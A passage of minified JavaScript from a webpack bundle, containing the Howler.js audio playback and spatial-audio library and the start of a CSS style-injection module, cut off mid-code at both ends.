e=s._muted||i._muted?0:s._volume;v.gain.setValueAtTime(e,o.ctx.currentTime),s._playStart=o.ctx.currentTime,void 0===v.bufferSource.start?s._loop?v.bufferSource.noteGrainOn(0,l,86400):v.bufferSource.noteGrainOn(0,l,h):s._loop?v.bufferSource.start(0,l,86400):v.bufferSource.start(0,l,h),u!==1/0&&(i._endTimers[s._id]=setTimeout(i._ended.bind(i,s),u)),t||setTimeout((function(){i._emit("play",s._id),i._loadQueue()}),0)};"running"===o.state?g():(i._playLock=!0,i.once("resume",g),i._clearTimer(s._id))}else{var y=function(){v.currentTime=l,v.muted=s._muted||i._muted||o._muted||v.muted,v.volume=s._volume*o.volume(),v.playbackRate=s._rate;try{var n=v.play();if(n&&"undefined"!=typeof Promise&&(n instanceof Promise||"function"==typeof n.then)?(i._playLock=!0,m(),n.then((function(){i._playLock=!1,v._unlocked=!0,t||(i._emit("play",s._id),i._loadQueue())})).catch((function(){i._playLock=!1,i._emit("playerror",s._id,"Playback was unable to start. This is most commonly an issue on mobile devices and Chrome where playback was not within a user interaction."),s._ended=!0,s._paused=!0}))):t||(i._playLock=!1,m(),i._emit("play",s._id),i._loadQueue()),v.playbackRate=s._rate,v.paused)return void i._emit("playerror",s._id,"Playback was unable to start. This is most commonly an issue on mobile devices and Chrome where playback was not within a user interaction.");"__default"!==e||s._loop?i._endTimers[s._id]=setTimeout(i._ended.bind(i,s),u):(i._endTimers[s._id]=function(){i._ended(s),v.removeEventListener("ended",i._endTimers[s._id],!1)},v.addEventListener("ended",i._endTimers[s._id],!1))}catch(e){i._emit("playerror",s._id,e)}};"data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA"===v.src&&(v.src=i._src,v.load());var b=window&&window.ejecta||!v.readyState&&o._navigator.isCocoonJS;if(v.readyState>=3||b)y();else{i._playLock=!0;var w=function(){y(),v.removeEventListener(o._canPlayEvent,w,!1)};v.addEventListener(o._canPlayEvent,w,!1),i._clearTimer(s._id)}}return s._id}i._ended(s)},pause:function(e){var t=this;if("loaded"!==t._state||t._playLock)return t._queue.push({event:"pause",action:function(){t.pause(e)}}),t;for(var i=t._getSoundIds(e),n=0;n<i.length;n++){t._clearTimer(i[n]);var r=t._soundById(i[n]);if(r&&!r._paused&&(r._seek=t.seek(i[n]),r._rateSeek=0,r._paused=!0,t._stopFade(i[n]),r._node))if(t._webAudio){if(!r._node.bufferSource)continue;void 0===r._node.bufferSource.stop?r._node.bufferSource.noteOff(0):r._node.bufferSource.stop(0),t._cleanBuffer(r._node)}else isNaN(r._node.duration)&&r._node.duration!==1/0||r._node.pause();arguments[1]||t._emit("pause",r?r._id:null)}return t},stop:function(e,t){var i=this;if("loaded"!==i._state||i._playLock)return i._queue.push({event:"stop",action:function(){i.stop(e)}}),i;for(var n=i._getSoundIds(e),r=0;r<n.length;r++){i._clearTimer(n[r]);var o=i._soundById(n[r]);o&&(o._seek=o._start||0,o._rateSeek=0,o._paused=!0,o._ended=!0,i._stopFade(n[r]),o._node&&(i._webAudio?o._node.bufferSource&&(void 0===o._node.bufferSource.stop?o._node.bufferSource.noteOff(0):o._node.bufferSource.stop(0),i._cleanBuffer(o._node)):isNaN(o._node.duration)&&o._node.duration!==1/0||(o._node.currentTime=o._start||0,o._node.pause(),o._node.duration===1/0&&i._clearSound(o._node))),t||i._emit("stop",o._id))}return i},mute:function(e,t){var i=this;if("loaded"!==i._state||i._playLock)return i._queue.push({event:"mute",action:function(){i.mute(e,t)}}),i;if(void 0===t){if("boolean"!=typeof e)return i._muted;i._muted=e}for(var n=i._getSoundIds(t),r=0;r<n.length;r++){var a=i._soundById(n[r]);a&&(a._muted=e,a._interval&&i._stopFade(a._id),i._webAudio&&a._node?a._node.gain.setValueAtTime(e?0:a._volume,o.ctx.currentTime):a._node&&(a._node.muted=!!o._muted||e),i._emit("mute",a._id))}return i},volume:function(){var e,t,i,n=this,r=arguments;if(0===r.length)return n._volume;if(1===r.length||2===r.length&&void 0===r[1]){var a=n._getSoundIds(),s=a.indexOf(r[0]);s>=0?t=parseInt(r[0],10):e=parseFloat(r[0])}else r.length>=2&&(e=parseFloat(r[0]),t=parseInt(r[1],10));if(!(void 0!==e&&e>=0&&e<=1))return(i=t?n._soundById(t):n._sounds[0])?i._volume:0;if("loaded"!==n._state||n._playLock)return n._queue.push({event:"volume",action:function(){n.volume.apply(n,r)}}),n;void 0===t&&(n._volume=e),t=n._getSoundIds(t);for(var c=0;c<t.length;c++)(i=n._soundById(t[c]))&&(i._volume=e,r[2]||n._stopFade(t[c]),n._webAudio&&i._node&&!i._muted?i._node.gain.setValueAtTime(e,o.ctx.currentTime):i._node&&!i._muted&&(i._node.volume=e*o.volume()),n._emit("volume",i._id));return n},fade:function(e,t,i,n){var r=this;if("loaded"!==r._state||r._playLock)return r._queue.push({event:"fade",action:function(){r.fade(e,t,i,n)}}),r;e=parseFloat(e),t=parseFloat(t),i=parseFloat(i),r.volume(e,n);for(var a=r._getSoundIds(n),s=0;s<a.length;s++){var c=r._soundById(a[s]);if(c){if(n||r._stopFade(a[s]),r._webAudio&&!c._muted){var l=o.ctx.currentTime,h=l+i/1e3;c._volume=e,c._node.gain.setValueAtTime(e,l),c._node.gain.linearRampToValueAtTime(t,h)}r._startFadeInterval(c,e,t,i,a[s],void 0===n)}}return r},_startFadeInterval:function(e,t,i,n,r,o){var a=this,s=t,c=i-t,l=Math.abs(c/.01),h=Math.max(4,l>0?n/l:n),u=Date.now();e._fadeTo=i,e._interval=setInterval((function(){var r=(Date.now()-u)/n;u=Date.now(),s+=c*r,s=Math.max(0,s),s=Math.min(1,s),s=Math.round(100*s)/100,a._webAudio?e._volume=s:a.volume(s,e._id,!0),o&&(a._volume=s),(i<t&&s<=i||i>t&&s>=i)&&(clearInterval(e._interval),e._interval=null,e._fadeTo=null,a.volume(i,e._id),a._emit("fade",e._id))}),h)},_stopFade:function(e){var t=this._soundById(e);return t&&t._interval&&(this._webAudio&&t._node.gain.cancelScheduledValues(o.ctx.currentTime),clearInterval(t._interval),t._interval=null,this.volume(t._fadeTo,e),t._fadeTo=null,this._emit("fade",e)),this},loop:function(){var e,t,i,n=this,r=arguments;if(0===r.length)return n._loop;if(1===r.length){if("boolean"!=typeof r[0])return!!(i=n._soundById(parseInt(r[0],10)))&&i._loop;e=r[0],n._loop=e}else 2===r.length&&(e=r[0],t=parseInt(r[1],10));for(var o=n._getSoundIds(t),a=0;a<o.length;a++)(i=n._soundById(o[a]))&&(i._loop=e,n._webAudio&&i._node&&i._node.bufferSource&&(i._node.bufferSource.loop=e,e&&(i._node.bufferSource.loopStart=i._start||0,i._node.bufferSource.loopEnd=i._stop)));return n},rate:function(){var e,t,i,n=this,r=arguments;if(0===r.length)t=n._sounds[0]._id;else if(1===r.length){var a=n._getSoundIds(),s=a.indexOf(r[0]);s>=0?t=parseInt(r[0],10):e=parseFloat(r[0])}else 2===r.length&&(e=parseFloat(r[0]),t=parseInt(r[1],10));if("number"!=typeof e)return(i=n._soundById(t))?i._rate:n._rate;if("loaded"!==n._state||n._playLock)return n._queue.push({event:"rate",action:function(){n.rate.apply(n,r)}}),n;void 0===t&&(n._rate=e),t=n._getSoundIds(t);for(var c=0;c<t.length;c++)if(i=n._soundById(t[c])){n.playing(t[c])&&(i._rateSeek=n.seek(t[c]),i._playStart=n._webAudio?o.ctx.currentTime:i._playStart),i._rate=e,n._webAudio&&i._node&&i._node.bufferSource?i._node.bufferSource.playbackRate.setValueAtTime(e,o.ctx.currentTime):i._node&&(i._node.playbackRate=e);var l=n.seek(t[c]),h=(n._sprite[i._sprite][0]+n._sprite[i._sprite][1])/1e3-l,u=1e3*h/Math.abs(i._rate);!n._endTimers[t[c]]&&i._paused||(n._clearTimer(t[c]),n._endTimers[t[c]]=setTimeout(n._ended.bind(n,i),u)),n._emit("rate",i._id)}return n},seek:function(){var e,t,i=this,n=arguments;if(0===n.length)t=i._sounds[0]._id;else if(1===n.length){var r=i._getSoundIds(),a=r.indexOf(n[0]);a>=0?t=parseInt(n[0],10):i._sounds.length&&(t=i._sounds[0]._id,e=parseFloat(n[0]))}else 2===n.length&&(e=parseFloat(n[0]),t=parseInt(n[1],10));if(void 0===t)return i;if("loaded"!==i._state||i._playLock)return i._queue.push({event:"seek",action:function(){i.seek.apply(i,n)}}),i;var s=i._soundById(t);if(s){if(!("number"==typeof e&&e>=0)){if(i._webAudio){var c=i.playing(t)?o.ctx.currentTime-s._playStart:0,l=s._rateSeek?s._rateSeek-s._seek:0;return s._seek+(l+c*Math.abs(s._rate))}return s._node.currentTime}var h=i.playing(t);h&&i.pause(t,!0),s._seek=e,s._ended=!1,i._clearTimer(t),i._webAudio||!s._node||isNaN(s._node.duration)||(s._node.currentTime=e);var u=function(){i._emit("seek",t),h&&i.play(t,!0)};if(h&&!i._webAudio){var d=function(){i._playLock?setTimeout(d,0):u()};setTimeout(d,0)}else u()}return i},playing:function(e){if("number"==typeof e){var t=this._soundById(e);return!!t&&!t._paused}for(var i=0;i<this._sounds.length;i++)if(!this._sounds[i]._paused)return!0;return!1},duration:function(e){var t=this._duration,i=this._soundById(e);return i&&(t=this._sprite[i._sprite][1]/1e3),t},state:function(){return this._state},unload:function(){for(var e=this,t=e._sounds,i=0;i<t.length;i++)t[i]._paused||e.stop(t[i]._id),e._webAudio||(e._clearSound(t[i]._node),t[i]._node.removeEventListener("error",t[i]._errorFn,!1),t[i]._node.removeEventListener(o._canPlayEvent,t[i]._loadFn,!1),o._releaseHtml5Audio(t[i]._node)),delete t[i]._node,e._clearTimer(t[i]._id);var n=o._howls.indexOf(e);n>=0&&o._howls.splice(n,1);var r=!0;for(i=0;i<o._howls.length;i++)if(o._howls[i]._src===e._src||e._src.indexOf(o._howls[i]._src)>=0){r=!1;break}return c&&r&&delete c[e._src],o.noAudio=!1,e._state="unloaded",e._sounds=[],e=null,null},on:function(e,t,i,n){var r=this["_on"+e];return"function"==typeof t&&r.push(n?{id:i,fn:t,once:n}:{id:i,fn:t}),this},off:function(e,t,i){var n=this["_on"+e],r=0;if("number"==typeof t&&(i=t,t=null),t||i)for(r=0;r<n.length;r++){var o=i===n[r].id;if(t===n[r].fn&&o||!t&&o){n.splice(r,1);break}}else if(e)this["_on"+e]=[];else{var a=Object.keys(this);for(r=0;r<a.length;r++)0===a[r].indexOf("_on")&&Array.isArray(this[a[r]])&&(this[a[r]]=[])}return this},once:function(e,t,i){return this.on(e,t,i,1),this},_emit:function(e,t,i){for(var n=this["_on"+e],r=n.length-1;r>=0;r--)n[r].id&&n[r].id!==t&&"load"!==e||(setTimeout(function(e){e.call(this,t,i)}.bind(this,n[r].fn),0),n[r].once&&this.off(e,n[r].fn,n[r].id));return this._loadQueue(e),this},_loadQueue:function(e){if(this._queue.length>0){var t=this._queue[0];t.event===e&&(this._queue.shift(),this._loadQueue()),e||t.action()}return this},_ended:function(e){var t=e._sprite;if(!this._webAudio&&e._node&&!e._node.paused&&!e._node.ended&&e._node.currentTime<e._stop)return setTimeout(this._ended.bind(this,e),100),this;var i=!(!e._loop&&!this._sprite[t][2]);if(this._emit("end",e._id),!this._webAudio&&i&&this.stop(e._id,!0).play(e._id),this._webAudio&&i){this._emit("play",e._id),e._seek=e._start||0,e._rateSeek=0,e._playStart=o.ctx.currentTime;var n=1e3*(e._stop-e._start)/Math.abs(e._rate);this._endTimers[e._id]=setTimeout(this._ended.bind(this,e),n)}return this._webAudio&&!i&&(e._paused=!0,e._ended=!0,e._seek=e._start||0,e._rateSeek=0,this._clearTimer(e._id),this._cleanBuffer(e._node),o._autoSuspend()),this._webAudio||i||this.stop(e._id,!0),this},_clearTimer:function(e){if(this._endTimers[e]){if("function"!=typeof this._endTimers[e])clearTimeout(this._endTimers[e]);else{var t=this._soundById(e);t&&t._node&&t._node.removeEventListener("ended",this._endTimers[e],!1)}delete this._endTimers[e]}return this},_soundById:function(e){for(var t=0;t<this._sounds.length;t++)if(e===this._sounds[t]._id)return this._sounds[t];return null},_inactiveSound:function(){this._drain();for(var e=0;e<this._sounds.length;e++)if(this._sounds[e]._ended)return this._sounds[e].reset();return new s(this)},_drain:function(){var e=this._pool,t=0,i=0;if(!(this._sounds.length<e)){for(i=0;i<this._sounds.length;i++)this._sounds[i]._ended&&t++;for(i=this._sounds.length-1;i>=0;i--){if(t<=e)return;this._sounds[i]._ended&&(this._webAudio&&this._sounds[i]._node&&this._sounds[i]._node.disconnect(0),this._sounds.splice(i,1),t--)}}},_getSoundIds:function(e){if(void 0===e){for(var t=[],i=0;i<this._sounds.length;i++)t.push(this._sounds[i]._id);return t}return[e]},_refreshBuffer:function(e){return e._node.bufferSource=o.ctx.createBufferSource(),e._node.bufferSource.buffer=c[this._src],e._panner?e._node.bufferSource.connect(e._panner):e._node.bufferSource.connect(e._node),e._node.bufferSource.loop=e._loop,e._loop&&(e._node.bufferSource.loopStart=e._start||0,e._node.bufferSource.loopEnd=e._stop||0),e._node.bufferSource.playbackRate.setValueAtTime(e._rate,o.ctx.currentTime),this},_cleanBuffer:function(e){var t=o._navigator&&o._navigator.vendor.indexOf("Apple")>=0;if(o._scratchBuffer&&e.bufferSource&&(e.bufferSource.onended=null,e.bufferSource.disconnect(0),t))try{e.bufferSource.buffer=o._scratchBuffer}catch(e){}return e.bufferSource=null,this},_clearSound:function(e){/MSIE |Trident\//.test(o._navigator&&o._navigator.userAgent)||(e.src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA")}};var s=function(e){this._parent=e,this.init()};s.prototype={init:function(){var e=this._parent;return this._muted=e._muted,this._loop=e._loop,this._volume=e._volume,this._rate=e._rate,this._seek=0,this._paused=!0,this._ended=!0,this._sprite="__default",this._id=++o._counter,e._sounds.push(this),this.create(),this},create:function(){var e=this._parent,t=o._muted||this._muted||this._parent._muted?0:this._volume;return e._webAudio?(this._node=void 0===o.ctx.createGain?o.ctx.createGainNode():o.ctx.createGain(),this._node.gain.setValueAtTime(t,o.ctx.currentTime),this._node.paused=!0,this._node.connect(o.masterGain)):(this._node=o._obtainHtml5Audio(),this._errorFn=this._errorListener.bind(this),this._node.addEventListener("error",this._errorFn,!1),this._loadFn=this._loadListener.bind(this),this._node.addEventListener(o._canPlayEvent,this._loadFn,!1),this._node.src=e._src,this._node.preload="auto",this._node.volume=t*o.volume(),this._node.load()),this},reset:function(){var e=this._parent;return this._muted=e._muted,this._loop=e._loop,this._volume=e._volume,this._rate=e._rate,this._seek=0,this._rateSeek=0,this._paused=!0,this._ended=!0,this._sprite="__default",this._id=++o._counter,this},_errorListener:function(){this._parent._emit("loaderror",this._id,this._node.error?this._node.error.code:0),this._node.removeEventListener("error",this._errorFn,!1)},_loadListener:function(){var e=this._parent;e._duration=Math.ceil(10*this._node.duration)/10,0===Object.keys(e._sprite).length&&(e._sprite={__default:[0,1e3*e._duration]}),"loaded"!==e._state&&(e._state="loaded",e._emit("load"),e._loadQueue()),this._node.removeEventListener(o._canPlayEvent,this._loadFn,!1)}};var c={},l=function(e){var t=e._src;if(c[t])return e._duration=c[t].duration,void d(e);if(/^data:[^;]+;base64,/.test(t)){for(var i=atob(t.split(",")[1]),n=new Uint8Array(i.length),r=0;r<i.length;++r)n[r]=i.charCodeAt(r);u(n.buffer,e)}else{var o=new XMLHttpRequest;o.open("GET",t,!0),o.withCredentials=e._xhrWithCredentials,o.responseType="arraybuffer",o.onload=function(){var t=(o.status+"")[0];"0"===t||"2"===t||"3"===t?u(o.response,e):e._emit("loaderror",null,"Failed loading audio file with status: "+o.status+".")},o.onerror=function(){e._webAudio&&(e._html5=!0,e._webAudio=!1,e._sounds=[],delete c[t],e.load())},h(o)}},h=function(e){try{e.send()}catch(t){e.onerror()}},u=function(e,t){var i=function(){t._emit("loaderror",null,"Decoding audio data failed.")},n=function(e){e&&t._sounds.length>0?(c[t._src]=e,d(t,e)):i()};"undefined"!=typeof Promise&&1===o.ctx.decodeAudioData.length?o.ctx.decodeAudioData(e).then(n).catch(i):o.ctx.decodeAudioData(e,n,i)},d=function(e,t){t&&!e._duration&&(e._duration=t.duration),0===Object.keys(e._sprite).length&&(e._sprite={__default:[0,1e3*e._duration]}),"loaded"!==e._state&&(e._state="loaded",e._emit("load"),e._loadQueue())},p=function(){if(o.usingWebAudio){try{"undefined"!=typeof AudioContext?o.ctx=new AudioContext:"undefined"!=typeof webkitAudioContext?o.ctx=new webkitAudioContext:o.usingWebAudio=!1}catch(e){o.usingWebAudio=!1}o.ctx||(o.usingWebAudio=!1);var e=/iP(hone|od|ad)/.test(o._navigator&&o._navigator.platform),t=o._navigator&&o._navigator.appVersion.match(/OS (\d+)_(\d+)_?(\d+)?/),i=t?parseInt(t[1],10):null;if(e&&i&&i<9){var n=/safari/.test(o._navigator&&o._navigator.userAgent.toLowerCase());(o._navigator&&o._navigator.standalone&&!n||o._navigator&&!o._navigator.standalone&&!n)&&(o.usingWebAudio=!1)}o.usingWebAudio&&(o.masterGain=void 0===o.ctx.createGain?o.ctx.createGainNode():o.ctx.createGain(),o.masterGain.gain.setValueAtTime(o._muted?0:1,o.ctx.currentTime),o.masterGain.connect(o.ctx.destination)),o._setup()}};void 0===(n=function(){return{Howler:o,Howl:a}}.apply(t,[]))||(e.exports=n),t.Howler=o,t.Howl=a,"undefined"!=typeof window?(window.HowlerGlobal=r,window.Howler=o,window.Howl=a,window.Sound=s):void 0!==i&&(i.HowlerGlobal=r,i.Howler=o,i.Howl=a,i.Sound=s)}(),function(){"use strict";var e;HowlerGlobal.prototype._pos=[0,0,0],HowlerGlobal.prototype._orientation=[0,0,-1,0,1,0],HowlerGlobal.prototype.stereo=function(e){if(!this.ctx||!this.ctx.listener)return this;for(var t=this._howls.length-1;t>=0;t--)this._howls[t].stereo(e);return this},HowlerGlobal.prototype.pos=function(e,t,i){return this.ctx&&this.ctx.listener?(t="number"!=typeof t?this._pos[1]:t,i="number"!=typeof i?this._pos[2]:i,"number"!=typeof e?this._pos:(this._pos=[e,t,i],void 0!==this.ctx.listener.positionX?(this.ctx.listener.positionX.setTargetAtTime(this._pos[0],Howler.ctx.currentTime,.1),this.ctx.listener.positionY.setTargetAtTime(this._pos[1],Howler.ctx.currentTime,.1),this.ctx.listener.positionZ.setTargetAtTime(this._pos[2],Howler.ctx.currentTime,.1)):this.ctx.listener.setPosition(this._pos[0],this._pos[1],this._pos[2]),this)):this},HowlerGlobal.prototype.orientation=function(e,t,i,n,r,o){if(!this.ctx||!this.ctx.listener)return this;var a=this._orientation;return t="number"!=typeof t?a[1]:t,i="number"!=typeof i?a[2]:i,n="number"!=typeof n?a[3]:n,r="number"!=typeof r?a[4]:r,o="number"!=typeof o?a[5]:o,"number"!=typeof e?a:(this._orientation=[e,t,i,n,r,o],void 0!==this.ctx.listener.forwardX?(this.ctx.listener.forwardX.setTargetAtTime(e,Howler.ctx.currentTime,.1),this.ctx.listener.forwardY.setTargetAtTime(t,Howler.ctx.currentTime,.1),this.ctx.listener.forwardZ.setTargetAtTime(i,Howler.ctx.currentTime,.1),this.ctx.listener.upX.setTargetAtTime(e,Howler.ctx.currentTime,.1),this.ctx.listener.upY.setTargetAtTime(t,Howler.ctx.currentTime,.1),this.ctx.listener.upZ.setTargetAtTime(i,Howler.ctx.currentTime,.1)):this.ctx.listener.setOrientation(e,t,i,n,r,o),this)},Howl.prototype.init=(e=Howl.prototype.init,function(t){return this._orientation=t.orientation||[1,0,0],this._stereo=t.stereo||null,this._pos=t.pos||null,this._pannerAttr={coneInnerAngle:void 0!==t.coneInnerAngle?t.coneInnerAngle:360,coneOuterAngle:void 0!==t.coneOuterAngle?t.coneOuterAngle:360,coneOuterGain:void 0!==t.coneOuterGain?t.coneOuterGain:0,distanceModel:void 0!==t.distanceModel?t.distanceModel:"inverse",maxDistance:void 0!==t.maxDistance?t.maxDistance:1e4,panningModel:void 0!==t.panningModel?t.panningModel:"HRTF",refDistance:void 0!==t.refDistance?t.refDistance:1,rolloffFactor:void 0!==t.rolloffFactor?t.rolloffFactor:1},this._onstereo=t.onstereo?[{fn:t.onstereo}]:[],this._onpos=t.onpos?[{fn:t.onpos}]:[],this._onorientation=t.onorientation?[{fn:t.onorientation}]:[],e.call(this,t)}),Howl.prototype.stereo=function(e,i){var n=this;if(!n._webAudio)return n;if("loaded"!==n._state)return n._queue.push({event:"stereo",action:function(){n.stereo(e,i)}}),n;var r=void 0===Howler.ctx.createStereoPanner?"spatial":"stereo";if(void 0===i){if("number"!=typeof e)return n._stereo;n._stereo=e,n._pos=[e,0,0]}for(var o=n._getSoundIds(i),a=0;a<o.length;a++){var s=n._soundById(o[a]);if(s){if("number"!=typeof e)return s._stereo;s._stereo=e,s._pos=[e,0,0],s._node&&(s._pannerAttr.panningModel="equalpower",s._panner&&s._panner.pan||t(s,r),"spatial"===r?void 0!==s._panner.positionX?(s._panner.positionX.setValueAtTime(e,Howler.ctx.currentTime),s._panner.positionY.setValueAtTime(0,Howler.ctx.currentTime),s._panner.positionZ.setValueAtTime(0,Howler.ctx.currentTime)):s._panner.setPosition(e,0,0):s._panner.pan.setValueAtTime(e,Howler.ctx.currentTime)),n._emit("stereo",s._id)}}return n},Howl.prototype.pos=function(e,i,n,r){var o=this;if(!o._webAudio)return o;if("loaded"!==o._state)return o._queue.push({event:"pos",action:function(){o.pos(e,i,n,r)}}),o;if(i="number"!=typeof i?0:i,n="number"!=typeof n?-.5:n,void 0===r){if("number"!=typeof e)return o._pos;o._pos=[e,i,n]}for(var a=o._getSoundIds(r),s=0;s<a.length;s++){var c=o._soundById(a[s]);if(c){if("number"!=typeof e)return c._pos;c._pos=[e,i,n],c._node&&(c._panner&&!c._panner.pan||t(c,"spatial"),void 0!==c._panner.positionX?(c._panner.positionX.setValueAtTime(e,Howler.ctx.currentTime),c._panner.positionY.setValueAtTime(i,Howler.ctx.currentTime),c._panner.positionZ.setValueAtTime(n,Howler.ctx.currentTime)):c._panner.setPosition(e,i,n)),o._emit("pos",c._id)}}return o},Howl.prototype.orientation=function(e,i,n,r){var o=this;if(!o._webAudio)return o;if("loaded"!==o._state)return o._queue.push({event:"orientation",action:function(){o.orientation(e,i,n,r)}}),o;if(i="number"!=typeof i?o._orientation[1]:i,n="number"!=typeof n?o._orientation[2]:n,void 0===r){if("number"!=typeof e)return o._orientation;o._orientation=[e,i,n]}for(var a=o._getSoundIds(r),s=0;s<a.length;s++){var c=o._soundById(a[s]);if(c){if("number"!=typeof e)return c._orientation;c._orientation=[e,i,n],c._node&&(c._panner||(c._pos||(c._pos=o._pos||[0,0,-.5]),t(c,"spatial")),void 0!==c._panner.orientationX?(c._panner.orientationX.setValueAtTime(e,Howler.ctx.currentTime),c._panner.orientationY.setValueAtTime(i,Howler.ctx.currentTime),c._panner.orientationZ.setValueAtTime(n,Howler.ctx.currentTime)):c._panner.setOrientation(e,i,n)),o._emit("orientation",c._id)}}return o},Howl.prototype.pannerAttr=function(){var e,i,n,r=this,o=arguments;if(!r._webAudio)return r;if(0===o.length)return r._pannerAttr;if(1===o.length){if("object"!=typeof o[0])return(n=r._soundById(parseInt(o[0],10)))?n._pannerAttr:r._pannerAttr;e=o[0],void 0===i&&(e.pannerAttr||(e.pannerAttr={coneInnerAngle:e.coneInnerAngle,coneOuterAngle:e.coneOuterAngle,coneOuterGain:e.coneOuterGain,distanceModel:e.distanceModel,maxDistance:e.maxDistance,refDistance:e.refDistance,rolloffFactor:e.rolloffFactor,panningModel:e.panningModel}),r._pannerAttr={coneInnerAngle:void 0!==e.pannerAttr.coneInnerAngle?e.pannerAttr.coneInnerAngle:r._coneInnerAngle,coneOuterAngle:void 0!==e.pannerAttr.coneOuterAngle?e.pannerAttr.coneOuterAngle:r._coneOuterAngle,coneOuterGain:void 0!==e.pannerAttr.coneOuterGain?e.pannerAttr.coneOuterGain:r._coneOuterGain,distanceModel:void 0!==e.pannerAttr.distanceModel?e.pannerAttr.distanceModel:r._distanceModel,maxDistance:void 0!==e.pannerAttr.maxDistance?e.pannerAttr.maxDistance:r._maxDistance,refDistance:void 0!==e.pannerAttr.refDistance?e.pannerAttr.refDistance:r._refDistance,rolloffFactor:void 0!==e.pannerAttr.rolloffFactor?e.pannerAttr.rolloffFactor:r._rolloffFactor,panningModel:void 0!==e.pannerAttr.panningModel?e.pannerAttr.panningModel:r._panningModel})}else 2===o.length&&(e=o[0],i=parseInt(o[1],10));for(var a=r._getSoundIds(i),s=0;s<a.length;s++)if(n=r._soundById(a[s])){var c=n._pannerAttr;c={coneInnerAngle:void 0!==e.coneInnerAngle?e.coneInnerAngle:c.coneInnerAngle,coneOuterAngle:void 0!==e.coneOuterAngle?e.coneOuterAngle:c.coneOuterAngle,coneOuterGain:void 0!==e.coneOuterGain?e.coneOuterGain:c.coneOuterGain,distanceModel:void 0!==e.distanceModel?e.distanceModel:c.distanceModel,maxDistance:void 0!==e.maxDistance?e.maxDistance:c.maxDistance,refDistance:void 0!==e.refDistance?e.refDistance:c.refDistance,rolloffFactor:void 0!==e.rolloffFactor?e.rolloffFactor:c.rolloffFactor,panningModel:void 0!==e.panningModel?e.panningModel:c.panningModel};var l=n._panner;l?(l.coneInnerAngle=c.coneInnerAngle,l.coneOuterAngle=c.coneOuterAngle,l.coneOuterGain=c.coneOuterGain,l.distanceModel=c.distanceModel,l.maxDistance=c.maxDistance,l.refDistance=c.refDistance,l.rolloffFactor=c.rolloffFactor,l.panningModel=c.panningModel):(n._pos||(n._pos=r._pos||[0,0,-.5]),t(n,"spatial"))}return r},Sound.prototype.init=function(e){return function(){var t=this._parent;this._orientation=t._orientation,this._stereo=t._stereo,this._pos=t._pos,this._pannerAttr=t._pannerAttr,e.call(this),this._stereo?t.stereo(this._stereo):this._pos&&t.pos(this._pos[0],this._pos[1],this._pos[2],this._id)}}(Sound.prototype.init),Sound.prototype.reset=function(e){return function(){var t=this._parent;return this._orientation=t._orientation,this._stereo=t._stereo,this._pos=t._pos,this._pannerAttr=t._pannerAttr,this._stereo?t.stereo(this._stereo):this._pos?t.pos(this._pos[0],this._pos[1],this._pos[2],this._id):this._panner&&(this._panner.disconnect(0),this._panner=void 0,t._refreshBuffer(this)),e.call(this)}}(Sound.prototype.reset);var t=function(e,t){"spatial"===(t=t||"spatial")?(e._panner=Howler.ctx.createPanner(),e._panner.coneInnerAngle=e._pannerAttr.coneInnerAngle,e._panner.coneOuterAngle=e._pannerAttr.coneOuterAngle,e._panner.coneOuterGain=e._pannerAttr.coneOuterGain,e._panner.distanceModel=e._pannerAttr.distanceModel,e._panner.maxDistance=e._pannerAttr.maxDistance,e._panner.refDistance=e._pannerAttr.refDistance,e._panner.rolloffFactor=e._pannerAttr.rolloffFactor,e._panner.panningModel=e._pannerAttr.panningModel,void 0!==e._panner.positionX?(e._panner.positionX.setValueAtTime(e._pos[0],Howler.ctx.currentTime),e._panner.positionY.setValueAtTime(e._pos[1],Howler.ctx.currentTime),e._panner.positionZ.setValueAtTime(e._pos[2],Howler.ctx.currentTime)):e._panner.setPosition(e._pos[0],e._pos[1],e._pos[2]),void 0!==e._panner.orientationX?(e._panner.orientationX.setValueAtTime(e._orientation[0],Howler.ctx.currentTime),e._panner.orientationY.setValueAtTime(e._orientation[1],Howler.ctx.currentTime),e._panner.orientationZ.setValueAtTime(e._orientation[2],Howler.ctx.currentTime)):e._panner.setOrientation(e._orientation[0],e._orientation[1],e._orientation[2])):(e._panner=Howler.ctx.createStereoPanner(),e._panner.pan.setValueAtTime(e._stereo,Howler.ctx.currentTime)),e._panner.connect(e._node),e._paused||e._parent.pause(e._id,!0).play(e._id,!0)}}()}).call(this,i(3))},function(e,t){var i;i=function(){return this}();try{i=i||new Function("return this")()}catch(e){"object"==typeof window&&(i=window)}e.exports=i},function(e,t,i){var n=i(5),r=i(6);"string"==typeof(r=r.__esModule?r.default:r)&&(r=[[e.i,r,""]]);var o={insert:"head",singleton:!1},a=(n(e.i,r,o),r.locals?r.locals:{});e.exports=a},function(e,t,i){"use strict";var n,r=function(){return void 0===n&&(n=Boolean(window&&document&&document.all&&!window.atob)),n},o=function(){var e={};return function(t){if(void 0===e[t]){var i=document.querySelector(t);if(window.HTMLIFrameElement&&i instanceof window.HTMLIFrameElement)try{i=i.contentDocument.head}catch(e){i=null}e[t]=i}return e[t]}}(),a={};function s(e,t,i){for(var n=0;n<t.length;n++){var r={css:t[n][1],media:t[n][2],sourceMap:t[n][3]};a[e][n]?a[e][n](r):a[e].push(m(r,i))}}function c(e){var t=document.createElement("style"),n=e.attributes||{};if(void 0===n.nonce){var r=i.nc;r&&(n.nonce=r)}if(Object.keys(n).forEach((function(e){t.setAttribute(e,n[e])})),"function"==typeof e.insert)e.insert(t);else{var a=o(e.insert||"head");if(!a)throw new Error("Couldn't find a style target. This probably means that the value for the 'insert' parameter is invalid.");a.appendChild(t)}return t}var l,h=(l=[],function(e,t){return l[e]=t,l.filter(Boolean).join("\n")});function u(e,t,i,n){var r=i?"":n.css;if(e.styleSheet)e.styleSheet.cssText=h(t,r);else{var o=document.createTextNode(r),a=e.childNodes;a[t]&&e.removeChild(a[t]),a.length?e.insertBefore(o,a[t]):e.appendChild(o)}}function d(e,t,i){var n=i.css,r=i.media,o=i.sourceMap;if(r?e.setAttribute("media",r):e.removeAttribute("media"),o&&btoa&&(n+="\n/*# sourceMappingURL=data:application/json;base64,".concat(btoa(unescape(encodeURIComponent(JSON.stringify(o))))," */")),e.styleSheet)e.styleSheet.cssText=n;else{for(;e.firstChild;)e.removeChild(e.firstChild);e.appendChild(document.createTextNode(n))}}var p=null,f=0;function m(e,t){var i,n,r;if(t.singleton){var 